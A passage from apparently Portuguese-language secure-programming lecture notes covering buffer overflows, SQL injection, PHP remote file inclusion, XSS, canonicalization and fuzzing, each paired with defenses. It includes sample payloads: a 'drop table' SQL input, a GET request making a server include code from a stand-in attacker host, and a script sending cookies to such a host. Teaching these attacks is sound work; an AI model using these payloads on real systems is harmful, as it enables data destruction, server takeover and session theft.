regra principal:</strong> nunca supor nada, verificar toda suposição, tratar todo estado de erro possível.</p><p><strong>O modelo abstrato (slide 574):</strong> um programa lê entrada de várias fontes, processa-a por um algoritmo, e produz saída para vários destinos. Roda no ambiente de um SO, com as instruções de máquina de um processador, usando chamadas de sistema e possivelmente outros programas. A execução pode salvar ou alterar dados no sistema ou causar outros efeitos colaterais. Tudo isso interage, muitas vezes de formas complexas. A definição exige que as suposições sobre a execução e os tipos de entrada sejam explícitas.</p><p><strong>Pressão de negócio (slide 575):</strong> programadores focam nos passos para o sucesso e no fluxo normal, não em cada ponto de falha. Tratar erros corretamente aumenta o código e o tempo de desenvolvimento, o que conflita com prazos curtos e vantagem de mercado. A menos que a segurança seja um objetivo de projeto desde o início, um programa seguro é improvável.</p><p><strong>Manutenção (slide 576):</strong> nas mudanças, verificar suposições, tratar todos os erros, checar as interações com o código existente. Falhar nisso pode introduzir vulnerabilidades em um programa que era seguro.</p><p><strong>A mentalidade defensiva (slide 577):</strong> uma mentalidade diferente de &quot;a maioria dos usuários, na maior parte do tempo&quot;. <strong>&quot;Paranoia é uma virtude&quot;:</strong> o crescimento dos relatos de vulnerabilidade prova a ameaça. Testes normais não encontram vulnerabilidades disparadas por entrada altamente incomum. Os programas precisam ser tão resilientes quanto possível a qualquer erro ou condição inesperada.</p><p><strong>Maturidade (slides 578 e 579):</strong> outras disciplinas de engenharia tratam segurança e confiabilidade como objetivos de projeto, e a sociedade não tolera pontes, prédios ou aeronaves que desabam. O software não alcançou essa maturidade; a sociedade tolera níveis de falha muito mais altos. Normas: <strong>ISO 12207</strong> (processos do ciclo de vida de software), SEI06. O <strong>SAFECode</strong> (Software Assurance Forum for Excellence in Code), formado por grandes empresas de TI, publica melhores práticas para garantia de software e desenvolvimento seguro. A <strong>modelagem de ameaças</strong> (análise de risco) deve fazer parte do processo de projeto (slide 580).</p><p><strong>Quatro áreas críticas de interação (slide 581):</strong></p><ol><li>Tratamento seguro da entrada (a questão inicial crítica).</li><li>Implementação do algoritmo.</li><li>Interação com outros componentes.</li><li>Saída do programa.</li></ol><p>Muitas vulnerabilidades vêm de um pequeno conjunto de erros comuns.</p><h3 id="_3-3-tratamento-da-entrada-e-estouro-de-buffer" tabindex="-1"><span class="cut mono-4 wght-0 slnt-5 step-3">3</span><span class="cut mono-1 wght-0 slnt-0 step-0">.</span><span class="cut mono-3 wght-2 slnt-4 step-3">3</span> <span class="cut mono-0 wght-0 slnt-5 step-2">T</span><span class="cut mono-2 wght-0 slnt-3 step-0">r</span><span class="cut mono-5 wght-0 slnt-1 step-0">a</span><span class="cut mono-1 wght-5 slnt-0 step-1">t</span><span class="cut mono-3 wght-0 slnt-2 step-2">a</span><span class="cut mono-0 wght-4 slnt-4 step-0">m</span><span class="cut mono-0 wght-0 slnt-0 step-2">e</span><span class="cut mono-3 wght-4 slnt-2 step-1">n</span><span class="cut mono-3 wght-1 slnt-3 step-3">t</span><span class="cut mono-3 wght-2 slnt-5 step-3">o</span> <span class="cut mono-2 wght-5 slnt-3 step-1">d</span><span class="cut mono-5 wght-1 slnt-1 step-1">a</span> <span class="cut mono-2 wght-1 slnt-0 step-3">e</span><span class="cut mono-4 wght-3 slnt-4 step-1">n</span><span class="cut mono-1 wght-4 slnt-1 step-2">t</span><span class="cut mono-0 wght-1 slnt-4 step-2">r</span><span class="cut mono-0 wght-2 slnt-1 step-2">a</span><span class="cut mono-1 wght-4 slnt-3 step-2">d</span><span class="cut mono-3 wght-3 slnt-4 step-0">a</span> <span class="cut mono-1 wght-1 slnt-3 step-3">e</span> <span class="cut mono-5 wght-2 slnt-1 step-3">e</span><span class="cut mono-5 wght-0 slnt-3 step-1">s</span><span class="cut mono-5 wght-4 slnt-5 step-1">t</span><span class="cut mono-1 wght-2 slnt-1 step-2">o</span><span class="cut mono-1 wght-3 slnt-4 step-0">u</span><span class="cut mono-0 wght-5 slnt-1 step-3">r</span><span class="cut mono-1 wght-2 slnt-4 step-3">o</span> <span class="cut mono-1 wght-3 slnt-4 step-2">d</span><span class="cut mono-0 wght-3 slnt-2 step-0">e</span> <span class="cut mono-5 wght-0 slnt-5 step-1">b</span><span class="cut mono-3 wght-4 slnt-4 step-0">u</span><span class="cut mono-2 wght-4 slnt-3 step-2">f</span><span class="cut mono-2 wght-5 slnt-4 step-3">f</span><span class="cut mono-4 wght-2 slnt-1 step-0">e</span><span class="cut mono-2 wght-3 slnt-3 step-1">r</span> <a class="header-anchor" href="#_3-3-tratamento-da-entrada-e-estouro-de-buffer" aria-hidden="true">#</a></h3><p><strong>Entrada (slide 582):</strong> qualquer fonte de dados fora do programa cujo valor o programador não conhece ao escrever o código. Fontes óbvias: teclado, mouse, arquivos, conexões de rede. Fontes indiretas: o ambiente de execução, arquivos de configuração, valores fornecidos pelo SO.</p><p><strong>Requisitos (slide 583):</strong> identificar todas as fontes de entrada, declarar as suposições sobre tamanho e tipo, verificá-las explicitamente no código, e usar os valores de forma consistente com elas. <strong>Duas preocupações:</strong> o <strong>tamanho</strong> da entrada, e seu <strong>significado e interpretação</strong>.</p><p><strong>Tamanho e estouro de buffer (slides 584 e 585):</strong> programadores supõem um tamanho máximo esperado (algumas linhas de texto) e alocam buffers fixos (512 ou 1024 bytes) sem verificar se a entrada real cabe. Se a entrada excede o buffer, o <strong>estouro</strong> pode comprometer a execução. Testes comuns usam entradas esperadas e não o encontram. Rotinas de biblioteca podem não limitar os dados copiados para o buffer, o que agrava. Prática segura: rotinas seguras de cópia de string e buffer, e consciência do programador.</p><p><strong>Mentalidade de codificação segura (slides 586 e 587):</strong> tratar qualquer entrada como perigosa. Usar buffers de tamanho dinâmico, ou processar a entrada em blocos do tamanho do buffer. Mesmo com buffers dinâmicos, verificar que o espaço requisitado não excede a memória disponível. Em erro de tamanho ou memória, falhar de forma graciosa: processar em blocos, descartar o excesso, ou terminar. Aplicar essas verificações onde quer que dados de valor desconhecido entrem ou sejam tratados, para toda fonte de entrada.</p><p><strong>O exemplo da aula, um estouro de buffer na pilha (slides 588 e 589):</strong></p><pre class="shiki shiki-themes vitesse-dark vitesse-light s-dark-dbd7caee s-light-393a34 s-dark-bg-121212 s-light-bg-ffffff" tabindex="0"><code class="language-c"><span class="line"><span class="s-dark-666666 s-light-999999">#</span><span class="s-dark-4d9375 s-light-1e754f">include</span><span class="s-dark-c98a7d77 s-light-b5695977"> &lt;</span><span class="s-dark-c98a7d s-light-b56959">stdio.h</span><span class="s-dark-c98a7d77 s-light-b5695977">&gt;</span></span>\n<span class="line"><span class="s-dark-666666 s-light-999999">#</span><span class="s-dark-4d9375 s-light-1e754f">include</span><span class="s-dark-c98a7d77 s-light-b5695977"> &lt;</span><span class="s-dark-c98a7d s-light-b56959">string.h</span><span class="s-dark-c98a7d77 s-light-b5695977">&gt;</span></span>\n<span class="line"></span>\n<span class="line"><span class="s-dark-cb7676 s-light-ab5959">char</span><span class="s-dark-cb7676 s-light-ab5959"> *</span><span class="s-dark-80a665 s-light-59873a">my_gets</span><span class="s-dark-666666 s-light-999999">(</span><span class="s-dark-cb7676 s-light-ab5959">char</span><span class="s-dark-cb7676 s-light-ab5959"> *</span><span class="s-dark-bd976a s-light-b07d48">s</span><span class="s-dark-666666 s-light-999999">)</span><span class="s-dark-666666 s-light-999999"> {</span></span>\n<span class="line"><span class="s-dark-cb7676 s-light-ab5959">    int</span><span class="s-dark-dbd7caee s-light-393a34"> c</span><span class="s-dark-666666 s-light-999999">;</span></span>\n<span class="line"><span class="s-dark-cb7676 s-light-ab5959">    char</span><span class="s-dark-cb7676 s-light-ab5959"> *</span><span class="s-dark-dbd7caee s-light-393a34">p </span><span class="s-dark-666666 s-light-999999">=</span><span class="s-dark-dbd7caee s-light-393a34"> s</span><span class="s-dark-666666 s-light-999999">;</span></span>\n<span class="line"><span class="s-dark-4d9375 s-light-1e754f">    while</span><span class="s-dark-666666 s-light-999999"> ((</span><span class="s-dark-dbd7caee s-light-393a34">c </span><span class="s-dark-666666 s-light-999999">=</span><span class="s-dark-80a665 s-light-59873a"> getchar</span><span class="s-dark-666666 s-light-999999">())</span><span class="s-dark-cb7676 s-light-ab5959"> !=</span><span class="s-dark-c98a7d77 s-light-b5695977"> &#39;</span><span class="s-dark-c99076 s-light-a65e2b">\\n</span><span class="s-dark-c98a7d77 s-light-b5695977">&#39;</span><span class="s-dark-cb7676 s-light-ab5959"> &amp;&amp;</span><span class="s-dark-dbd7caee s-light-393a34"> c </span><span class="s-dark-cb7676 s-light-ab5959">!=</span><span class="s-dark-dbd7caee s-light-393a34"> EOF</span><span class="s-dark-666666 s-light-999999">)</span><span class="s-dark-666666 s-light-999999"> {</span></span>\n<span class="line"><span class="s-dark-cb7676 s-light-ab5959">        *</span><span class="s-dark-dbd7caee s-light-393a34">p</span><span class="s-dark-cb7676 s-light-ab5959">++</span><span class="s-dark-666666 s-light-999999"> =</span><span class="s-dark-dbd7caee s-light-393a34"> c</span><span class="s-dark-666666 s-light-999999">;</span><span class="s-dark-758575dd s-light-a0ada0">                    /* no length check */</span></span>\n<span class="line"><span class="s-dark-666666 s-light-999999">    }</span></span>\n<span class="line"><span class="s-dark-cb7676 s-light-ab5959">    *</span><span class="s-dark-dbd7caee s-light-393a34">p </span><span class="s-dark-666666 s-light-999999">=</span><span class="s-dark-c98a7d77 s-light-b5695977"> &#39;</span><span class="s-dark-c99076 s-light-a65e2b">\\0</span><span class="s-dark-c98a7d77 s-light-b5695977">&#39;</span><span class="s-dark-666666 s-light-999999">;</span></span>\n<span class="line"><span class="s-dark-4d9375 s-light-1e754f">    return</span><span class="s-dark-dbd7caee s-light-393a34"> s</span><span class="s-dark-666666 s-light-999999">;</span></span>\n<span class="line"><span class="s-dark-666666 s-light-999999">}</span></span>\n<span class="line"></span>\n<span class="line"><span class="s-dark-cb7676 s-light-ab5959">void</span><span class="s-dark-80a665 s-light-59873a"> consulta_nome</span><span class="s-dark-666666 s-light-999999">(</span><span class="s-dark-cb7676 s-light-ab5959">char</span><span class="s-dark-cb7676 s-light-ab5959"> *</span><span class="s-dark-bd976a s-light-b07d48">s</span><span class="s-dark-666666 s-light-999999">)</span><span class="s-dark-666666 s-light-999999"> {</span><span class="s-dark-758575dd s-light-a0ada0">        /* pretend it comes from the database */</span></span>\n<span class="line"><span class="s-dark-80a665 s-light-59873a">    strcpy</span><span class="s-dark-666666 s-light-999999">(</span><span class="s-dark-dbd7caee s-light-393a34">s</span><span class="s-dark-666666 s-light-999999">,</span><span class="s-dark-c98a7d77 s-light-b5695977"> &quot;</span><span class="s-dark-c98a7d s-light-b56959">Gabriel</span><span class="s-dark-c98a7d77 s-light-b5695977">&quot;</span><span class="s-dark-666666 s-light-999999">);</span></span>\n<span class="line"><span class="s-dark-666666 s-light-999999">}</span></span>\n<span class="line"></span>\n<span class="line"><span class="s-dark-cb7676 s-light-ab5959">int</span><span class="s-dark-80a665 s-light-59873a"> main</span><span class="s-dark-666666 s-light-999999">()</span><span class="s-dark-666666 s-light-999999"> {</span></span>\n<span class="line"><span class="s-dark-cb7676 s-light-ab5959">    char</span><span class="s-dark-bd976a s-light-b07d48"> var_outrasInfos</span><span class="s-dark-666666 s-light-999999">[</span><span class="s-dark-4c9a91 s-light-2f798a">10</span><span class="s-dark-666666 s-light-999999">];</span></span>\n<span class="line"><span class="s-dark-cb7676 s-light-ab5959">    char</span><span class="s-dark-bd976a s-light-b07d48"> var_nome</span><span class="s-dark-666666 s-light-999999">[</span><span class="s-dark-4c9a91 s-light-2f798a">10</span><span class="s-dark-666666 s-light-999999">];</span></span>\n<span class="line"><span class="s-dark-80a665 s-light-59873a">    consulta_nome</span><span class="s-dark-666666 s-light-999999">(</span><span class="s-dark-dbd7caee s-light-393a34">var_nome</span><span class="s-dark-666666 s-light-999999">);</span></span>\n<span class="line"><span class="s-dark-80a665 s-light-59873a">    my_gets</span><span class="s-dark-666666 s-light-999999">(</span><span class="s-dark-dbd7caee s-light-393a34">var_outrasInfos</span><span class="s-dark-666666 s-light-999999">);</span></span>\n<span class="line"><span class="s-dark-80a665 s-light-59873a">    printf</span><span class="s-dark-666666 s-light-999999">(</span><span class="s-dark-c98a7d77 s-light-b5695977">&quot;</span><span class="s-dark-c98a7d s-light-b56959">Dados: Nome: </span><span class="s-dark-c99076 s-light-a65e2b">%s</span><span class="s-dark-c99076 s-light-a65e2b"> \\n</span><span class="s-dark-c98a7d s-light-b56959">Outras Informacoes: </span><span class="s-dark-c99076 s-light-a65e2b">%s</span><span class="s-dark-c99076 s-light-a65e2b"> \\n</span><span class="s-dark-c98a7d77 s-light-b5695977">&quot;</span><span class="s-dark-666666 s-light-999999">,</span><span class="s-dark-dbd7caee s-light-393a34"> var_nome</span><span class="s-dark-666666 s-light-999999">,</span><span class="s-dark-dbd7caee s-light-393a34"> var_outrasInfos</span><span class="s-dark-666666 s-light-999999">);</span></span>\n<span class="line"><span class="s-dark-80a665 s-light-59873a">    printf</span><span class="s-dark-666666 s-light-999999">(</span><span class="s-dark-c98a7d77 s-light-b5695977">&quot;</span><span class="s-dark-c98a7d s-light-b56959">==Fim do Programa==</span><span class="s-dark-c99076 s-light-a65e2b">\\n</span><span class="s-dark-c98a7d77 s-light-b5695977">&quot;</span><span class="s-dark-666666 s-light-999999">);</span></span>\n<span class="line"><span class="s-dark-4d9375 s-light-1e754f">    return</span><span class="s-dark-4c9a91 s-light-2f798a"> 0</span><span class="s-dark-666666 s-light-999999">;</span></span>\n<span class="line"><span class="s-dark-666666 s-light-999999">}</span></span></code></pre><pre class="shiki shiki-themes vitesse-dark vitesse-light s-dark-dbd7caee s-light-393a34 s-dark-bg-121212 s-light-bg-ffffff" tabindex="0"><code class="language-bash"><span class="line"><span class="s-dark-80a665 s-light-59873a">gcc</span><span class="s-dark-c99076 s-light-a65e2b"> -o</span><span class="s-dark-c98a7d s-light-b56959"> buffer_overlflow</span><span class="s-dark-c98a7d s-light-b56959"> buffer_overlflow.c</span></span>\n<span class="line"><span class="s-dark-80a665 s-light-59873a">./buffer_overlflow</span></span></code></pre><ol><li>Digite algo curto (&quot;Teste&quot;): o programa funciona.</li><li>Digite mais de 10 caracteres (&quot;1234567890AAAAA&quot;): <code>var_nome</code> (&quot;Gabriel&quot;) é sobrescrito pelos caracteres excedentes, porque os dois buffers têm 10 bytes na pilha e <code>my_gets</code> nunca verifica o comprimento.</li><li>Com uma entrada longa o programa imprime o nome corrompido e depois <code>*** stack smashing detected ***: terminated</code>, e o shell informa SIGABRT. Essa mensagem significa que o GCC inseriu uma proteção que detectou a corrupção da pilha quando a função tentou retornar (slide 591).</li><li>Para reproduzir o ataque clássico, compile com <code>-fno-stack-protector</code> (slide 592), rode de novo, e procure o sinal em <code>man 7 signal</code>.</li></ol><pre class="shiki shiki-themes vitesse-dark vitesse-light s-dark-dbd7caee s-light-393a34 s-dark-bg-121212 s-light-bg-ffffff" tabindex="0"><code class="language-bash"><span class="line"><span class="s-dark-80a665 s-light-59873a">gcc</span><span class="s-dark-c99076 s-light-a65e2b"> -fno-stack-protector</span><span class="s-dark-c99076 s-light-a65e2b"> -o</span><span class="s-dark-c98a7d s-light-b56959"> buffer_overlflow</span><span class="s-dark-c98a7d s-light-b56959"> buffer_overflow.c</span></span>\n<span class="line"><span class="s-dark-80a665 s-light-59873a">./buffer_overlflow</span></span></code></pre><h3 id="_3-4-interpretacao-da-entrada" tabindex="-1"><span class="cut mono-5 wght-3 slnt-5 step-2">3</span><span class="cut mono-3 wght-1 slnt-4 step-3">.</span><span class="cut mono-2 wght-4 slnt-1 step-3">4</span> <span class="cut mono-4 wght-0 slnt-4 step-0">I</span><span class="cut mono-1 wght-5 slnt-3 step-0">n</span><span class="cut mono-3 wght-3 slnt-1 step-3">t</span><span class="cut mono-4 wght-3 slnt-1 step-0">e</span><span class="cut mono-4 wght-4 slnt-5 step-2">r</span><span class="cut mono-2 wght-1 slnt-2 step-0">p</span><span class="cut mono-5 wght-0 slnt-2 step-1">r</span><span class="cut mono-1 wght-3 slnt-4 step-3">e</span><span class="cut mono-4 wght-5 slnt-4 step-0">t</span><span class="cut mono-3 wght-3 slnt-4 step-0">a</span><span class="cut mono-2 wght-5 slnt-1 step-2">ç</span><span class="cut mono-2 wght-2 slnt-4 step-3">ã</span><span class="cut mono-3 wght-1 slnt-2 step-1">o</span> <span class="cut mono-4 wght-0 slnt-2 step-2">d</span><span class="cut mono-2 wght-5 slnt-4 step-1">a</span> <span class="cut mono-1 wght-3 slnt-0 step-2">e</span><span class="cut mono-5 wght-0 slnt-2 step-2">n</span><span class="cut mono-2 wght-3 slnt-3 step-1">t</span><span class="cut mono-1 wght-4 slnt-1 step-1">r</span><span class="cut mono-0 wght-0 slnt-2 step-2">a</span><span class="cut mono-1 wght-2 slnt-1 step-2">d</span><span class="cut mono-5 wght-1 slnt-2 step-2">a</span> <a class="header-anchor" href="#_3-4-interpretacao-da-entrada" aria-hidden="true">#</a></h3><p><strong>Binário versus texto (slide 593):</strong> o significado da entrada é tão crítico quanto o seu tamanho. Para dados binários, o programa supõe que valores brutos representam inteiros, floats, strings ou estruturas, e essa suposição precisa ser validada conforme os valores são lidos. Exemplos: quadros Ethernet, pacotes IP, segmentos TCP; DNS, SNMP, NFS. Exigem validação contra a especificação de sintaxe abstrata.</p><p><strong>Heartbleed (slide 594):</strong> o bug do OpenSSL de <strong>2014</strong>. Uma falha em verificar a validade de um valor de entrada binário: o código não verificava a quantidade de dados pedida para retorno contra a quantidade fornecida. Classificado como <strong>leitura excessiva de buffer</strong>. Atacantes leram memória adjacente e vazaram nomes de usuário, senhas, chaves privadas e outros dados sensíveis.</p><p><strong>Texto e conjuntos de caracteres (slides 595 e 596):</strong> bytes brutos são interpretados como caracteres conforme um conjunto de caracteres, tradicionalmente ASCII, com extensões diferentes para caracteres acentuados no Windows e no macOS, e internacionalização crescente hoje. O programa precisa identificar qual conjunto está em uso. Além dos caracteres, o significado precisa ser identificado (inteiro, float, nome de arquivo, URL, e-mail) e o tipo confirmado. A falha permite a um atacante influenciar a operação do programa.</p><p><strong>Ataques de injeção (slides 597 e 599):</strong> exploram a falha em validar a interpretação da entrada. Dados de entrada influenciam, por acidente ou de propósito, o fluxo de execução. Mecanismo comum: a entrada é passada como parâmetro a um programa auxiliar cuja saída o programa original usa. Frequente em linguagens de script (Perl, PHP, Python, sh) que reúsam utilitários do sistema, e em scripts CGI web que processam dados de formulários HTML. Defesas: validação da entrada, e tratamento correto de entrada internacionalizada.</p><p><strong>Desserialização insegura (slide 598):</strong> a serialização converte objetos em um fluxo de bytes e os reconstrói depois, uma forma complexa de interpretação de entrada binária. A vulnerabilidade: a aplicação aceita objetos serializados de fontes não confiáveis e supõe que o fluxo é um objeto válido e seguro. O atacante manipula os bytes, e durante a reconstrução o sistema roda a lógica do atacante, muitas vezes <strong>execução remota de código (RCE)</strong>.</p><p><strong>Injeção de SQL (slide 600):</strong> a entrada do usuário constrói uma requisição SQL. PHP vulnerável:</p><pre class="shiki shiki-themes vitesse-dark vitesse-light s-dark-dbd7caee s-light-393a34 s-dark-bg-121212 s-light-bg-ffffff" tabindex="0"><code class="language-php"><span class="line"><span class="s-dark-666666 s-light-999999">$</span><span class="s-dark-bd976a s-light-b07d48">name</span><span class="s-dark-666666 s-light-999999"> =</span><span class="s-dark-666666 s-light-999999"> $</span><span class="s-dark-bd976a s-light-b07d48">_REQUEST</span><span class="s-dark-666666 s-light-999999">[</span><span class="s-dark-c98a7d77 s-light-b5695977">&#39;</span><span class="s-dark-c98a7d s-light-b56959">name</span><span class="s-dark-c98a7d77 s-light-b5695977">&#39;</span><span class="s-dark-666666 s-light-999999">];</span></span>\n<span class="line"><span class="s-dark-666666 s-light-999999">$</span><span class="s-dark-bd976a s-light-b07d48">query</span><span class="s-dark-666666 s-light-999999"> =</span><span class="s-dark-c98a7d77 s-light-b5695977"> &quot;</span><span class="s-dark-4d9375 s-light-1e754f">SELECT</span><span class="s-dark-cb7676 s-light-ab5959"> *</span><span class="s-dark-4d9375 s-light-1e754f"> FROM</span><span class="s-dark-c98a7d s-light-b56959"> suppliers </span><span class="s-dark-4d9375 s-light-1e754f">WHERE</span><span class="s-dark-4d9375 s-light-1e754f"> name</span><span class="s-dark-cb7676 s-light-ab5959"> =</span><span class="s-dark-c98a7d s-light-b56959"> &#39;</span><span class="s-dark-c98a7d77 s-light-b5695977">&quot;</span><span class="s-dark-cb7676 s-light-ab5959"> .</span><span class="s-dark-666666 s-light-999999"> $</span><span class="s-dark-bd976a s-light-b07d48">name</span><span class="s-dark-cb7676 s-light-ab5959"> .</span><span class="s-dark-c98a7d77 s-light-b5695977"> &quot;</span><span class="s-dark-c98a7d s-light-b56959">&#39;;</span><span class="s-dark-c98a7d77 s-light-b5695977">&quot;</span><span class="s-dark-666666 s-light-999999">;</span></span>\n<span class="line"><span class="s-dark-666666 s-light-999999">$</span><span class="s-dark-bd976a s-light-b07d48">result</span><span class="s-dark-666666 s-light-999999"> =</span><span class="s-dark-b8a965 s-light-998418"> mysql_query</span><span class="s-dark-666666 s-light-999999">($</span><span class="s-dark-bd976a s-light-b07d48">query</span><span class="s-dark-666666 s-light-999999">);</span></span></code></pre><p>A entrada <code>Bob</code> funciona como esperado. A entrada <code>Bob&#39;; drop table suppliers</code> recupera o registro e apaga a tabela inteira. Semelhante à injeção de comando, mas com metacaracteres SQL. <strong>Prevenção:</strong> validar a entrada antes do uso (escapar metacaracteres ou rejeitar), usar as funções de sanitização da linguagem, usar <strong>placeholders ou parâmetros SQL</strong> em vez de concatenação, combinar com stored procedures.</p><p><strong>Injeção de código (slides 601 e 602):</strong> a entrada inclui código que o sistema atacado roda depois. Cenário PHP: variáveis constroem nomes de arquivo em scripts de inclusão.</p><pre class="shiki shiki-themes vitesse-dark vitesse-light s-dark-dbd7caee s-light-393a34 s-dark-bg-121212 s-light-bg-ffffff" tabindex="0"><code class="language-php"><span class="line"><span class="s-dark-4d9375 s-light-1e754f">include</span><span class="s-dark-666666 s-light-999999"> $</span><span class="s-dark-bd976a s-light-b07d48">path</span><span class="s-dark-cb7676 s-light-ab5959"> .</span><span class="s-dark-c98a7d77 s-light-b5695977"> &#39;</span><span class="s-dark-c98a7d s-light-b56959">functions.php</span><span class="s-dark-c98a7d77 s-light-b5695977">&#39;</span><span class="s-dark-666666 s-light-999999">;</span></span>\n<span class="line"><span class="s-dark-4d9375 s-light-1e754f">include</span><span class="s-dark-666666 s-light-999999"> $</span><span class="s-dark-bd976a s-light-b07d48">path</span><span class="s-dark-cb7676 s-light-ab5959"> .</span><span class="s-dark-c98a7d77 s-light-b5695977"> &#39;</span><span class="s-dark-c98a7d s-light-b56959">data/prefs.php</span><span class="s-dark-c98a7d77 s-light-b5695977">&#39;</span><span class="s-dark-666666 s-light-999999">;</span></span></code></pre><p>O script é chamado diretamente, contornando a intenção original, usando dois recursos do PHP: variáveis globais atribuídas a partir da requisição HTTP, e <code>include</code> aceitando URLs remotas.</p><pre class="shiki shiki-themes vitesse-dark vitesse-light s-dark-dbd7caee s-light-393a34 s-dark-bg-121212 s-light-bg-ffffff" tabindex="0"><code class="language-text"><span class="line"><span>GET /calendar/embed/day.php?path=http://hacker.site/hack.txt?&amp;cmd=ls</span></span></code></pre><p><code>$path</code> recebe a URL do atacante e o arquivo remoto roda com os privilégios do servidor web. <strong>Defesas:</strong> bloquear a atribuição automática de campos de formulário a variáveis globais (guardá-los em um array e buscar por nome, o padrão no PHP mais novo; pode quebrar código legado); usar só valores constantes em <code>include</code> e <code>require</code>, ou validar uma variável rigorosamente logo antes do uso. Outras variantes: injeção de e-mail, string de formato, injeção de interpretador. A necessidade crítica: identificar todas as fontes de entrada, validar as suposições antes do uso, entender como cada função ou serviço interpreta os valores que recebe.</p><p><strong>Cross-site scripting, XSS (slides 603 e 604):</strong> código injetado em um livro de visitas envia o cookie da vítima ao atacante, permitindo personificação:</p><pre class="shiki shiki-themes vitesse-dark vitesse-light s-dark-dbd7caee s-light-393a34 s-dark-bg-121212 s-light-bg-ffffff" tabindex="0"><code class="language-html"><span class="line"><span class="s-dark-dbd7caee s-light-393a34">Thanks for this information, its great!</span></span>\n<span class="line"><span class="s-dark-666666 s-light-999999">&lt;</span><span class="s-dark-4d9375 s-light-1e754f">script</span><span class="s-dark-666666 s-light-999999">&gt;</span><span class="s-dark-bd976a s-light-b07d48">document</span><span class="s-dark-666666 s-light-999999">.</span><span class="s-dark-bd976a s-light-b07d48">location</span><span class="s-dark-666666 s-light-999999">=</span><span class="s-dark-c98a7d77 s-light-b5695977">&#39;</span><span class="s-dark-c98a7d s-light-b56959">http://hacker.web.site/cookie.cgi?</span><span class="s-dark-c98a7d77 s-light-b5695977">&#39;</span><span class="s-dark-cb7676 s-light-ab5959">+</span><span class="s-dark-bd976a s-light-b07d48">document</span><span class="s-dark-666666 s-light-999999">.</span><span class="s-dark-bd976a s-light-b07d48">cookie</span><span class="s-dark-666666 s-light-999999">&lt;/</span><span class="s-dark-4d9375 s-light-1e754f">script</span><span class="s-dark-666666 s-light-999999">&gt;</span></span></code></pre><p><strong>Ofuscação:</strong> o atacante escreve o script com entidades de caracteres HTML (<code>&amp;#60;&amp;#115;&amp;#99;...</code> para <code>&lt;sc...</code>). O navegador o interpreta de forma idêntica. <strong>Prevenção:</strong> examinar a entrada do usuário, remover ou escapar código perigoso, e fazer os validadores traduzirem as entidades HTML antes de verificar. <strong>Natureza da falha:</strong> uma falha no tratamento tanto da entrada quanto da saída. O alvo real é o <strong>próximo usuário</strong>, não o servidor. A sanitização da saída detém o ataque. Problemas semelhantes: CSRF e HTTP response splitting (uso descuidado de entrada não confiável).</p><p><strong>Validação de sintaxe (slide 605):</strong> garantir que os dados obedecem às suposições (caracteres imprimíveis, formato de e-mail, inteiros) antes do uso.</p><div class="table-wrapper"><table><thead><tr><th>Estratégia</th><th>Método</th><th>Veredito</th></tr></thead><tbody><tr><td><strong>Lista branca</strong></td><td>Comparar com o que se quer, aceitar o válido</td><td>Recomendada</td></tr><tr><td><strong>Lista negra</strong></td><td>Comparar com valores perigosos conhecidos</td><td>Falha a cada nova evasão</td></tr></tbody></table></div><p>Muitas vezes implementada com expressões regulares. Em caso de falha: rejeitar a entrada, ou sanitizá-la escapando os metacaracteres.</p><p><strong>Canonicalização (slide 606):</strong> caracteres têm múltiplas codificações (HTML, Unicode/UTF-8). O caractere <code>/</code> tem várias representações UTF-8 além do padrão <code>2F</code>. Atacantes usam codificações longas ou redundantes para contornar filtros (uma falha do Microsoft IIS nos anos 1990). <strong>Solução:</strong> transformar a entrada em uma representação única, padrão e mínima <strong>antes da validação</strong>. Usar bibliotecas anti-XSS ou frameworks web que automatizam isso.</p><p><strong>Valores numéricos (slide 607):</strong> tamanhos fixos (8, 16, 32, 64 bits), com ou sem sinal. Uma vulnerabilidade de <strong>conversão de tipo</strong> (casting) ocorre quando um valor é convertido incorretamente entre tipos: um tamanho de buffer lido como sem sinal e depois comparado como com sinal. Um valor muito grande, com o bit mais alto ligado, é lido como negativo, passa na verificação de tamanho máximo, e estoura quando usado para alocação ou cópia.</p><p><strong>Fuzzing (slide 608):</strong> uma técnica de teste de <strong>Barton Miller (1989)</strong> que usa dados gerados aleatoriamente como entrada, para ver se o programa trata entrada anormal ou trava. Vantagens: simples, barata, independente de suposições sobre a entrada esperada, encontra falhas sérias e exploráveis. Limitação: pode perder bugs que exigem condições de entrada muito específicas. Essencial para desenvolvedores (prevenção) e atacantes (descoberta de vulnerabilidades).</p><h3 id="_3-5-algoritmos-memoria-e-concorrencia" tabindex="-1"><span class="cut mono-0 wght-3 slnt-0 step-0">3</span><span class="cut mono-2 wght-3 slnt-0 step-3">.</span><span class="cut mono-1 wght-3 slnt-4 step-0">5</span> <span class="cut mono-1 wght-4 slnt-4 step-3">A</span><span class="cut mono-3 wght-4 slnt-3 step-1">l</span><span class="cut mono-2 wght-0 slnt-1 step-3">g</span><span class="cut mono-0 wght-4 slnt-4 step-3">o</span><span class="cut mono-2 wght-5 slnt-3 step-2">r</span><span class="cut mono-1 wght-4 slnt-0 step-3">i</span><span class="cut mono-1 wght-0 slnt-3 step-3">t</span><span class="cut mono-0 wght-1 slnt-4 step-1">m</span><span class="cut mono-2 wght-0 slnt-1 step-2">o</span><span class="cut mono-5 wght-2 slnt-2 step-1">s</span><span class="cut mono-0 wght-5 slnt-5 step-0">,</span> <span class="cut mono-2 wght-3 slnt-4 step-2">m</span><span class="cut mono-5 wght-1 slnt-0 step-1">e</span><span class="cut mono-2 wght-3 slnt-3 step-2">m</span><span class="cut mono-4 wght-3 slnt-5 step-3">ó</span><span class="cut mono-3 wght-2 slnt-2 step-1">r</span><span class="cut mono-1 wght-1 slnt-4 step-0">i</span><span class="cut mono-4 wght-4 slnt-5 step-3">a</span> <span class="cut mono-5 wght-2 slnt-4 step-1">e</span> <span class="cut mono-1 wght-3 slnt-2 step-1">c</span><span class="cut mono-2 wght-2 slnt-2 step-0">o</span><span class="cut mono-1 wght-5 slnt-5 step-1">n</span><span class="cut mono-5 wght-5 slnt-0 step-1">c</span><span class="cut mono-2 wght-1 slnt-2 step-0">o</span><span class="cut mono-4 wght-1 slnt-4 step-0">r</span><span class="cut mono-3 wght-0 slnt-1 step-1">r</span><span class="cut mono-1 wght-5 slnt-0 step-3">ê</span><span class="cut mono-0 wght-0 slnt-2 step-3">n</span><span class="cut mono-3 wght-4 slnt-0 step-0">c</span><span class="cut mono-2 wght-3 slnt-4 step-0">i</span><span class="cut mono-3 wght-5 slnt-2 step-3">a</span> <a class="header-anchor" href="#_3-5-algoritmos-memoria-e-concorrencia" aria-hidden="true">#</a></h3><p><strong>Implementação do algoritmo (slide 609):</strong> falhas de projeto ou implementação criam bugs exploráveis. Exemplos: 